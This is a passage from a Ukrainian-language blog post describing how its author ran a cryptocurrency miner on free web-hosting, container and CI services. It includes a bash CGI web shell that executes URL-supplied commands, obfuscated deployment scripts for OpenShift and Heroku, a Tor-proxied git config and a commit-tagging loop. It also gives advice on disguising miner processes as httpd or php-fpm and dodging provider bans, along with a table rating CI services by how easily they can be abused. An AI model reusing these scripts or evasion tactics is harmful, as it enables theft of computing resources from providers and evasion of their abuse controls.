<span class=hljs-keyword>do</span><span class=hljs-built_in>declare</span> var_<span class=hljs-variable>${parm[i]}</span>=<span class=hljs-variable>${parm[i+1]}</span><span class=hljs-keyword>done</span><span class=hljs-comment>## exec command for interactive and proclimited scenarios</span>
url_encoded=<span class=hljs-string>"<span class=hljs-variable>${var_path//+/ }</span>"</span><span class=hljs-built_in>export</span> PATH=<span class=hljs-string>".:<span class=hljs-variable>$PATH</span>"</span>
. /dev/shm/srv/utils/load.env &>/dev/null

<span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -f <span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span> 1>/dev/null; <span class=hljs-keyword>then</span><span class=hljs-comment>## don't use -n, redirect fd for bcompat</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
<span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>builtin</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>else</span><span class=hljs-built_in>printf</span><span class=hljs-string>'exec %b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>fi</span><span class=hljs-keyword>fi</span>
. /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src</code></pre><p>Краще покладатися тільки на вбудовані файли, оскільки роздвоєння додаткових процесів може бути недопустимим у веб -в'язницях, але це завжди можливо<code>exec</code> що дозволяє нам використовувати більшість утиліт командного рядка. Більшість веб -оболонок написано іншими мовами сценаріїв, такими як python або php, оскільки вам не потрібно турбуватися про форк.<p>У середовищі cpanel краще використовувати статичну назву для процесу майнера, наприклад<code>httpd</code> або<code>php-fpm</code> тому що<code>cgi</code> базується на багатопроцесорній обробці, тому сервери завжди заповнені багатьма процесами з такою назвою, хоча уважний спостерігач повинен це помітити<em> багатопотоковий</em> шаблон використання, який точно не поширений (або можливий) для таких мов, як perl, php, ruby ​​або python!<p>Процеси також мають обмеження за часом за замовчуванням (1 година, 1 день тощо), для цього ми просто використовуємо завдання cron, яке перезапускає крапельницю.<p>Це вимагало багато ручного редагування, API cpanel для автоматизації цього, на жаль, не доступні для кінцевих користувачів, тому веб -хостинг є незграбною та нудною метою для нашого майнера -крапельниці.<h3 id=web_environments><a class=header-anchor href=#web_environments> Веб -середовища</a></h3><p>Існує<em> SaaS</em> провайдерів, які мають веб -редактор у поєднанні з контейнером, наприклад<a href="with a free tier before getting acquired by amazon"> хмара9</a> , [codeanywhere], [codenvy]. Розгорнути крапельницю тут легко (у вас повноцінне середовище), але тримати її в роботі - це тягар, оскільки будь -який інтерактивний веб -редактор припиняє сеанс незабаром після закриття веб -сторінки, і контейнер, отже, переходить у режим сну (якщо ви не звичайно платити).<p>Уникнення цього може означати лише те, що ми повинні тримати сеанси відкритими, деякі сценарії за допомогою [puppeteer] досягли бажаного результату, але тривала робота, витік пам’яті, роздуті веб -сторінки SPA, безумовно, непривабливі і не приховуються, тому що з серверної частини провайдера, сесія, відкрита цілодобово, безперечно виглядатиме підозріло. Дійсно, веб -середовища також незграбні та нудні мішені.<h3 id=free_apps_services><a class=header-anchor href=#free_apps_services> Послуги безкоштовних програм</a></h3><p>Це в основному<a href="when it used to have a free tier"> відкрита зміна</a><sup id=fnref:openshift><a class=fnref href=#fndef:openshift>[11]</a></sup> і [героку]. Будучи kubernetes, Openshift був дещо простим для розгортання, але повним відхилення конфігурації, ось уривок:<pre><code class="sh hljs"><span class=hljs-built_in>export</span> PATH=.:<span class=hljs-variable>$PATH</span>

[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_PRJ</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"no account data provided"</span>; <span class=hljs-built_in>exit</span> 1; }
obfs=~/utils/deploy/obfs.sh
[ -x <span class=hljs-variable>$obfs</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs utility not found!"</span>; <span class=hljs-built_in>exit</span> 1; }
launcher=~/launcher
[ -f <span class=hljs-variable>$launcher</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"launcher script not found!"</span>; <span class=hljs-built_in>exit</span> 1; }

ctroot=<span class=hljs-variable>${CT_ROOT_DIR:-oc-ct-box-mine}</span><span class=hljs-comment>## the service that starts the miner is named app in /etc/services.d in the rootfs</span>
scriptpath=<span class=hljs-string>"rootfs/etc/services.d/app/run"</span>
TYPE=<span class=hljs-variable>${HRK_TYPE:-worker}</span>
IMG=$(oc-endpoint)/<span class=hljs-variable>$OC_PRJ</span>/<span class=hljs-variable>$OC_APP</span>
tspath=/tmp/oc-tmp-apprun
prepend=<span class=hljs-string>"#!/usr/bin/with-contenv bash
"</span><span class=hljs-comment>## beware the newline ^^^</span><span class=hljs-built_in>cd</span><span class=hljs-variable>$ctroot</span> || { <span class=hljs-built_in>echo</span><span class=hljs-string>"couldn't find ct build directory"</span>; <span class=hljs-built_in>exit</span> 1; }

VARS=$(cat vars) || { <span class=hljs-built_in>echo</span><span class=hljs-string>'vars file empty!'</span>; }
VARS=<span class=hljs-variable>${VARS//$'\n'/ }</span>
VARS=<span class=hljs-variable>${VARS//\\/\\\\}</span><span class=hljs-comment>## preserve escapes</span>
script=$(cat <span class=hljs-variable>$launcher</span> | tail +2 | sed -r <span class=hljs-string>'/^echo "export \\$/a '</span><span class=hljs-string>"<span class=hljs-variable>$VARS</span>"</span><span class=hljs-string>' \\'</span>)
cat <<< <span class=hljs-string>"<span class=hljs-variable>$script</span>"</span> > <span class=hljs-variable>$tspath</span><span class=hljs-variable>$obfs</span><span class=hljs-variable>$tspath</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs file not found?"</span>; <span class=hljs-built_in>exit</span> 1; }
cat <<< <span class=hljs-string>"$prepend<span class=hljs-subst>$(cat <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span>)</span>"</span> > <span class=hljs-variable>$scriptpath</span><span class=hljs-built_in>exec</span> itself (should <span class=hljs-built_in>eval</span>)
chmod +x <span class=hljs-variable>$scriptpath</span>

docker build -t <span class=hljs-variable>$IMG</span>  . || <span class=hljs-built_in>exit</span> 1
<span class=hljs-built_in>cd</span> -
oc-push-image <span class=hljs-string>"<span class=hljs-variable>$IMG</span>"</span></code></pre><p>Це був сценарій, використаний для створення контейнера для майнінгу, який вимагав шаблону yaml:<pre><code class="yaml hljs"><span class=hljs-attr>apiVersion:</span><span class=hljs-string>build.openshift.io/v1</span><span class=hljs-attr>kind:</span><span class=hljs-string>BuildConfig</span><span class=hljs-attr>metadata:</span><span class=hljs-attr>labels:</span><span class=hljs-attr>build:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>spec:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>5184000</span><span class=hljs-attr>failedBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>successfulBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>resources:</span><span class=hljs-attr>limits:</span><span class=hljs-attr>cpu:</span><span class=hljs-number>2</span><span class=hljs-attr>memory:</span><span class=hljs-string>1Gi</span><span class=hljs-attr>runPolicy:</span><span class=hljs-string>Serial</span><span class=hljs-attr>source:</span><span class=hljs-attr>type:</span><span class=hljs-string>Binary</span><span class=hljs-attr>strategy:</span><span class=hljs-attr>sourceStrategy:</span><span class=hljs-attr>from:</span><span class=hljs-attr>kind:</span><span class=hljs-string>ImageStreamTag</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}-build:latest</span><span class=hljs-attr>namespace:</span><span class=hljs-string>${OC_PRJ}</span><span class=hljs-attr>type:</span><span class=hljs-string>Source</span><span class=hljs-attr>template:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>2400</span><span class=hljs-attr>triggers:</span><span class=hljs-bullet>-</span><span class=hljs-attr>generic:</span><span class=hljs-attr>secretReference:</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>type:</span><span class=hljs-string>Generic</span></code></pre><p>Але весь процес включав досить багато кроків!<pre><code class="sh hljs"><span class=hljs-comment>## init</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && <span class=hljs-built_in>export</span> $(<$(tfi))
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && { . ./choose-creds || <span class=hljs-built_in>exit</span> 1; }
oc-login
oc new-project <span class=hljs-variable>$OC_PRJ</span> || { [ -z <span class=hljs-string>"<span class=hljs-subst>$(oc get projects)</span>"</span> ] && <span class=hljs-built_in>exit</span> 1; }
oc new-app <span class=hljs-variable>$OC_APP</span> --allow-missing-images || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## build box with docker and push</span><span class=hljs-comment># oc-docker-login || exit 1</span>
oc-build-mine || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## create dc config</span><span class=hljs-built_in>export</span> OC_TEMPLATE_TYPE=mine
oc-box-template || <span class=hljs-built_in>exit</span> 1
rtr=0
<span class=hljs-keyword>while</span> [ <span class=hljs-variable>$rtr</span> -lt 10 ]; <span class=hljs-keyword>do</span>
  oc rollout latest <span class=hljs-variable>$OC_APP</span> && <span class=hljs-built_in>break</span>
  rtr=$((rtr+<span class=hljs-number>1</span>))
  <span class=hljs-built_in>read</span> -t 1
<span class=hljs-keyword>done</span><span class=hljs-built_in>exit</span><span class=hljs-comment>## builds</span>
bash -x oc-build-build || <span class=hljs-built_in>exit</span> 1
bash -x oc-build-template || <span class=hljs-built_in>exit</span> 1
oc start-build <span class=hljs-variable>$OC_APP</span> || <span class=hljs-built_in>exit</span> 1

accounts=<span class=hljs-variable>${ACCOUNTS_DIR:-accounts_queue}</span>
mv <span class=hljs-variable>$accounts</span>/<span class=hljs-variable>${OC_USR}</span>{\.this,\.$(date +%s)}</code></pre><p>У псевдокоді:<ul><li><p>створити проект<li><p>створити додаток без зображення<li><p>побудувати майнінг -контейнер<li><p>розгорнути контейнер з конфігурацією розгортання (абстракція kubernetes)<li><p>розгортання розгортання</ul><p>Файл<code>build-build</code> сценарії замість цього створили<em> будувати</em> контейнер, який буде видобувати по кілька годин за раз. Збірки та звичайні модулі мають окремі ресурси у відкритому режимі, тому ми використали їх обидва. В цілому Openshift був поганим досвідом, оскільки він пройшов чотири різні випуски (можливо, більше, я перестав відстежувати через деякий час), і кожен з них вимагав змін до конфігурацій, у них не було шляхів оновлення, і все було швидко переглянуто, і це було звичайним явищем щоб збірки/стручки затримувалися, а не збирали сміття ... вони час від часу запускали ручні перезавантаження, можливо, kubernetes просто помилявся :)<p>Конфігурація Heroku була дещо простішою (вона не стосується kubernetes). Крім збірки контейнерів, яка була схожа на відкриту, інші були лише дві команди cli<pre><code class="bash hljs">heroku config:<span class=hljs-built_in>set</span> HRK_APP=<span class=hljs-variable>$HRK_APP</span> -a <span class=hljs-variable>$HRK_APP</span>
heroku container:release -a <span class=hljs-variable>$HRK_APP</span><span class=hljs-variable>$TYPE</span></code></pre><p>Контейнер був безпосередньо переміщений докером до реєстру heroku.<sup id=fnref:herokucontainers><a class=fnref href=#fndef:herokucontainers>[12]</a></sup> Суперечка з heroku (вільний рівень якого ще стояв до моменту написання статті) полягає в тому, що dynos може працювати лише 22 дні на місяць, тому вони вимагали щомісячного керування вручну, знову ж таки незграбного та нудного. Вони дійсно виконували деякі заборонні хвилі на початку, а потім відключили реєстрацію через TOR, я абсолютно впевнений, що я став причиною цього.<h3 id=ci_containers_or_vms><a class=header-anchor href=#ci_containers_or_vms> Контейнери CI або VM</a></h3><p>Це були найбільш синергетичні цілі для нашої крапельниці. Тут багато<a href=https://en.wikipedia.org/wiki/Continuous_integration> CI</a> компанії, багато з яких спалюють гроші інвесторів, пропонуючи безкоштовні рівні в надії зібрати певну частку ринку у бізнесі технічної інфраструктури.<p>Усі ці послуги пропонують різні ресурси, мають різні вимоги до конфігурації та працюють у різних середовищах. Я ніколи не думав про автоматизацію реєстрації облікового запису, тому що такі речі жахливі для програмування, я намагаюся їх уникати весь час, тому я просто певний час витримував реєстрацію вручну, тому що мені було цікаво, яку відповідь на антиспам я отримаю (і чим відрізняється від решти!). Ви можете здогадатися про деякі речі щодо управління компанією за тим, як вона поводиться зі спамом:<ul><li><p>Чи виконує він заборонні хвилі? Тоді вони мають несувору політику, проблеми вирішуються вручну та від випадку до випадку<li><p>Чи потрібна перевірка по телефону? У минулому вони вже зловживали<li><p>Чи реагують вони на велике використання ресурсів? Вони працюють з обмеженим бюджетом<li><p>Чи застосовують вони обмеження облікового запису або тіньові заборони? Якщо вони приховують заборону, вони мають злих системних адміністраторів.</ul><p>Існує також філософське питання: якщо служба дозволяє тривалий час зловживати їх системою, чи означає це, що вони мають першокласну інфраструктуру, здатну витримувати навантаження, або просто поганий контроль над своєю системою? І ви повинні враховувати баланс між доступністю та безпекою, надто безпечна система може зменшити утримання користувачів.<p>Ось таблиця, яка показує деякі служби, до яких я розгорнув:<table><tbody><tr class="header headerLastRow"><th style=text-align:center>ci<th style=text-align:center>конфігурація<th style=text-align:center>продуктивність<th style=text-align:center>бан-молоток<tr><td style=text-align:center>Бітрейз<td style=color:red;text-align:center>погано<td style=color:#ff0;text-align:center>середній<td style=color:#ff0;text-align:center>середній<tr><td style=text-align:center>Тревіс<td style=color:green;text-align:center>добре<td style=color:#ff0;text-align:center>середній<td style=color:green;text-align:center>добре<tr><td style=text-align:center>Кодекси<td style=color:#ff0;text-align:center>середній<td style=color:red;text-align:center>погано<td style=color:#ff0;text-align:center>середній<tr><td style=text-align:center>Гітлаб<td style=color:#ff0;text-align:center>середній<td style=color:green;text-align:center>добре<td style=color:green;text-align:center>добре<tr><td style=text-align:center>Circleci<td style=color:red;text-align:center>погано<td style=color:green;text-align:center>добре<td style=color:#ff0;text-align:center>середній<tr><td style=text-align:center>Семафор<td style=color:green;text-align:center>добре<td style=color:green;text-align:center>добре<td style=color:#ff0;text-align:center>середній<tr><td style=text-align:center>Докер<td style=color:#ff0;text-align:center>середній<td style=color:#ff0;text-align:center>середній<td style=color:green;text-align:center>добре<tr><td style=text-align:center>Набережна<td style=color:green;text-align:center>добре<td style=color:#ff0;text-align:center>середній<td style=color:#ff0;text-align:center>середній<tr><td style=text-align:center>Codefresh<td style=color:red;text-align:center>погано<td style=color:green;text-align:center>добре<td style=color:#ff0;text-align:center>середній<tr><td style=text-align:center>Веркер<td style=color:#ff0;text-align:center>середній<td style=color:#ff0;text-align:center>середній<td style=color:red;text-align:center>погано<tr><td style=text-align:center>Azure-конвеєри<td style=color:#ff0;text-align:center>середній<td style=color:#ff0;text-align:center>середній<td style=color:red;text-align:center>погано<tr><td style=text-align:center>Continuousphp<td style=color:red;text-align:center>погано<td style=color:#ff0;text-align:center>середній<td style=color:#ff0;text-align:center>середній<tr><td style=text-align:center>Приятелю<td style=color:red;text-align:center>погано<td style=color:red;text-align:center>погано<td style=color:red;text-align:center>погано<tr><td style=text-align:center>Дрон<td style=color:red;text-align:center>погано<td style=color:green;text-align:center>добре<td style=color:red;text-align:center>погано<tr><td style=text-align:center>Провідник<td style=color:red;text-align:center>погано<td style=color:#ff0;text-align:center>середній<td style=color:red;text-align:center>погано<tr><td style=text-align:center>Ніколи не кодувати<td style=color:red;text-align:center>погано<td style=color:green;text-align:center>добре<td style=color:#ff0;text-align:center>середній<tr><td style=text-align:center>Зейст/верцель<td style=color:red;text-align:center>погано<td style=color:green;text-align:center>добре<td style=color:red;text-align:center>погано</table><p>У цьому контексті а<span style=color:green> добре</span> Конфігурація означає, що для налаштування a не знадобилося багато часу<code>ci</code> робота для процесу майнінгу (як і всі послуги, які покладаються на веб-інформаційну панель замість точкового файлу сховища),<span style=color:red> погано</span><code>ban-hammer</code> означає, що було важко зареєструватись у службі, або що облікові записи будуть заблоковані більш агресивно.<p><a href=https://web.archive.org/web/20210222050951/https://www.bitrise.io/> Бітрейз</a> вимагає налаштування проекту, визначення середовища, цільової архітектури, процесу виконання тощо. Налаштування збірки займало багато часу, тому вона отримала погану оцінку в конфігурації.<a href=https://web.archive.org/web/20210310010750/https://continuousphp.com/> Continuousphp</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> Приятелю</a> , [Codefresh] також мав багато ручних недекларативних кроків налаштування.<p>Послуги, такі як [Azure-pipelines],<a href=https://web.archive.org/web/20210308202144/https://app.wercker.com/> Веркер</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> Приятелю</a> застосовує тіньові заборони до облікових записів, тіньові заборони погані, оскільки вони дозволяють вам здогадуватися, чи щось не так з вашою конфігурацією чи ні. За допомогою деяких сервісів ви можете вгадати причину заборони (майже ваша збірка зайняла занадто багато часу, або ви побудували занадто багато разів за короткий період), для деяких інших, таких як [Azure-pipelines], я припускаю, що вони застосували певний відбиток пальця до репозиторіїв користувачів, оскільки заборони проходили навіть без будь -якого зловживання ресурсами, також обмежено використання лазури та верцелю<code>DNS</code> доступ до загальнодоступних машин, тому це було додатковим тертям, яке потрібно було подолати за допомогою спеціального тунелю.<p><a href=https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome> Дрон</a> надав доступ до цілого процесора з 16+ ядер, але в кінцевому підсумку заборонив після 2 збірок<sup id=fnref:saddrone><a class=fnref href=#fndef:saddrone>[13]</a></sup>. <a href=https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship> Кодекси</a> також надає доступ до потужних хостів збірки і не забороняв так агресивно, як дрони.<p>Мої улюблені послуги не через прибутковість, а для зручності та зручності (також з іншими проектами) були<a href=https://web.archive.org/web/20210324163536/https://travis-ci.org/> Тревіс</a>, <a href=https://web.archive.org/web/20210308041527/https://semaphoreci.com/> Семафор</a> та<a href=https://web.archive.org/web/20210322105637/https://hub.docker.com/> Докер-хаб</a> . Travis схожий на стандартний CI і дуже гнучкий, єдиний - семафор<code>DSL</code> за<code>CI</code> це виглядало доступним і добре, хоча замість просто нескінченної послідовності спагеттифікованих прапорців, таких як інші інтерфейси користувача, і Docker лише для простоти зіставлення файлів docker для збірок.<h3 id=builds_configs><a class=header-anchor href=#builds_configs> Створює конфігурації</a></h3><p>Збірки були ініційовані або роботами cron, пропонованими веб -службами, або комітами git. Тож вам потрібно було відстежувати засмічення токенів доступу або ключів ssh для управління всіма комітами git. Важливо також не надмірно спамувати коміти та використовувати проксі-сервери під час натискання на сховища з налаштуванням git:<pre><code class="toml hljs"><span class=hljs-section>[http]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[https]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[url "https://"]</span><span class=hljs-attr>insteadOf</span> = git://</code></pre><p>Використовуючи послуги хостингу git, github був більш ретельним щодо заборон, але вони були виконані лише за повідомленнями про зловживання адміністраторами цивільних служб, gitlab один раз виконав хвилю заборони, коли я намагався поновити пробну версію CI (необережно). Я ніколи не отримував заборони на обліковий запис bitbucket. Щоб (примусово) натиснути git-коміти, у нас є довгий цикл, який заново мічає сховище git:<pre><code class="bash hljs"><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span>
    repos_count=$(ls -ld <span class=hljs-variable>${repos}</span>/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    <span class=hljs-keyword>for</span> r <span class=hljs-keyword>in</span><span class=hljs-variable>$repos</span>/*; <span class=hljs-keyword>do</span><span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$r</span>"</span>
        git fetch --all
        tagger
        <span class=hljs-built_in>echo</span> -e <span class=hljs-string>"\e[32m"</span><span class=hljs-string>"sleeping for <span class=hljs-variable>$repos_ival</span> since <span class=hljs-subst>$(date +%H:%M:%S\ %b/%d)</span>"</span><span class=hljs-string>"\e[0m"</span>
        sleep <span class=hljs-variable>$repos_ival</span><span class=hljs-keyword>done</span>
    sleep 1
<span class=hljs-keyword>done</span></code></pre><p>Можливо, силовий натиск у такий спосіб не дуже подобається github і міг стати причиною того, що облікові записи були позначені. Функція тегування, яка має намір змусити натискати різні коміти, використовує веб -сайт (який ви можете легко знайти), який дає деякі випадкові коміти. Я не впевнений, наскільки це допомагає, оскільки сам зміст комітів явно підозрілий для мого випадку. І це також вкусило мене в дупу одного разу, оскільки коміти, повернені цією командою, можуть містити лайливі слова, одне з моїх комітів було взято твіттер -ботом, який відстежує git -коміти з лайливими словами! Я додав чорний список поганих слів після інциденту.<p>Я справді не заглиблювався у заплутані git -коміти та заплутані git -сховища. Єдиний випадок, коли я використовував більш складний репозиторій, - це Bitrise, оскільки ви не могли налаштувати збірку, якщо система не розпізнавала середовище (наприклад, мобільні додатки), але навіть тоді не було жодного обертання, і воно завжди було однаковим сховище, досить легко виявити.<p>Загалом, якби мені довелося побудувати криву дзвоника навколо оптимального часу для видобутку<em> без</em>заборона облікових записів у всіх перевірених сервісах була б із центром тривалості збірки 1 годину, раз на день. Для ядер процесора, окрім кількох неправдомовців (наприклад, безпілотників), більшість служб очікують, що ви використаєте повну кількість ресурсів, які вам надаються, оскільки збірки виконуються всередині віртуальних машин або контейнерів з обмеженими ресурсами ... і компіляція зазвичай є завданням, яке насичує процесор, тому він не має статистичної значимості. Індуїтивно одна збірка на день - це те, що зробив би середній розробник, тому слід очікувати піднятих прапорів, якщо відхилитися від середнього, і наполягання на зловживанні ніколи не закінчиться добре.<h2 id=conclusions><a class=header-anchor href=#conclusions> Висновки</a></h2><p>Чи варто було того? Мережеві частини були, безумовно, цікавими, справа з реєстрацією облікових записів, очевидно, була найгіршою, ніхто не любить натискати нескінченні електронні листи з підтвердженням і, зрештою, повторювати загальмовані процедури інтерфейсу. Писати програмне забезпечення для автоматизації спаму також нудно (тому що ви переважно тикаєте в тупі API), і з цим припущенням (і тим, що це ніколи не було серйозним явищем) я навіть не замислювався над цим. Чи це було вигідно? На піку він досягав чогось подібного<code>300$</code> на місяць, можливо, для венесуельця вистачить, мені не дуже :)<p><table class=fndef id=fndef:adversary><tbody><tr><td class=fndef-backref><a href=#fnref:adversary>[1]</a><td class=fndef-content><em> сварливий системний адміністратор</em></table><table class=fndef id=fndef:infoproc><tbody><tr><td class=fndef-backref><a href=#fnref:infoproc>[2]</a><td class=fndef-content>навіть якщо це порушило б багато припущень щодо конфіденційності, я впевнений, що більшість із них просто заглядають всередину, коли виникає актуальна проблема, але це проблема лише для середовищ виконання на основі контейнерів, тоді як віртуальні машини - це майже чорні скриньки.</table><table class=fndef id=fndef:monerominer><tbody><tr><td class=fndef-backref><a href=#fnref:monerominer>[3]</a><td class=fndef-content>Майнер, вбудований у вузол monero, попрацював над тим, щоб зробити його більш зручним у фоновому режимі, але розповсюдження xmrig ніколи не було зосереджене на дружбі з фоном.</table><table class=fndef id=fndef:difficulty><tbody><tr><td class=fndef-backref><a href=#fnref:difficulty>[5]</a><td class=fndef-content>деякі пули пропонують різні труднощі на різних портах підключення, і мають тенденцію узгоджувати складність роботи з загальнодоступними майнерами, але деталізація проксі -сервера все одно була більш зручною, оскільки це запобігало б пулу<a href=https://en.wikipedia.org/wiki/Vendor_lock-in> зафіксувати</a> (хоча насправді ми ніколи не змінювали пули).</table><table class=fndef id=fndef:configwatch><tbody><tr><td class=fndef-backref><a href=#fnref:configwatch>[4]</a><td class=fndef-content>не щасливо, коли конфігурація раптово з'явилася і зникла з файлової системи</table><table class=fndef id=fndef:stratumprotocol><tbody><tr><td class=fndef-backref><a href=#fnref:stratumprotocol>[6]</a><td class=fndef-content>Ми не говоримо про<a href=https://en.bitcoin.it/wiki/Stratum_mining_protocol> протокол страти</a> оскільки ми просто маємо справу з тим, що в ній реалізовано<em> обидва</em> пул і майнер ... що зазвичай є мінімумом і, можливо, з нестандартними розширеннями.</table><table class=fndef id=fndef:fullbash><tbody><tr><td class=fndef-backref><a href=#fnref:fullbash>[7]</a><td class=fndef-content>ніколи не наповнюйся :)</table><table class=fndef id=fndef:memoryondemand><tbody><tr><td class=fndef-backref><a href=#fnref:memoryondemand>[8]</a><td class=fndef-content>Я не досліджував, що відбувається, коли процеси завантажують додаткові функціональні можливості під час виконання, оскільки ядро ​​шукатиме адресу в макеті пам’яті виконуваного файлу, який би мав доступ до файлової системи та, можливо, спричинив збій.</table><table class=fndef id=fndef:freehostinglimits><tbody><tr><td class=fndef-backref><a href=#fnref:freehostinglimits>[9]</a><td class=fndef-content>Межі довільні, час процесора менше секунди, пам'ять менше 128 Мб, вихідні з'єднання блокуються.</table><table class=fndef id=fndef:cpanelssh><tbody><tr><td class=fndef-backref><a href=#fnref:cpanelssh>[10]</a><td class=fndef-content>з трохи терпіння ви також можете запустити повний екземпляр ssh у середовищі, завантаженому навколо простору облікового запису cpanel,<em> без</em> мати доступ до вбудованого SSH cpanel, який, як правило, вимикається провайдерами хостингу.</table><table class=fndef id=fndef:openshift><tbody><tr><td class=fndef-backref><a href=#fnref:openshift>[11]</a><td class=fndef-content>відкриття змінилося з 1 року безкоштовного рівня до 3 місяців до 1 місяця, почавши вимагати автентифікації телефону, я можу гарантувати, що не я був єдиним, хто зловживав їх послугами.</table><table class=fndef id=fndef:herokucontainers><tbody><tr><td class=fndef-backref><a href=#fnref:herokucontainers>[12]</a><td class=fndef-content>Контейнери безкоштовного рівня Heroku мають досить великі ресурси, вони забезпечують 4c/8t (віртуальний) процесор, велику кількість оперативної пам’яті та великий обсяг пам’яті (який, однак, не є постійним і відкидається під час вимкнення системи dyno).</table><table class=fndef id=fndef:saddrone><tbody><tr><td class=fndef-backref><a href=#fnref:saddrone>[13]</a><td class=fndef-content>Вони додають більш жорсткі правила реєстрації, після кількох заборон я, можливо, зробив свій внесок у це.</table><p><div id=post-tags-list>Теги дописів: <span class=post-tag><a href=https://www.unto.re/tag/crypto> крипто</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/net> нетто</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/shell> оболонка</a></span></div><div class=page-foot><div class=copyright>21 серпня 2021 року</div></div></div><div class=page__footer><footer><div class=page__footer-copyright>© untoreh - Працює на<a href=https://github.com/tlienart/Franklin.jl> Франклін</a></div><div class=page__footer-links>- <ul><li><a href=/uk/sitemapxml> Карта сайту</a></li> | <li><a href=/uk/tag> Теги</a></li> | <li><a href=https://www.unto.re/tag/feed.xml> RSS</a></ul></div><ul class=author__wrap><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li></ul></footer></div>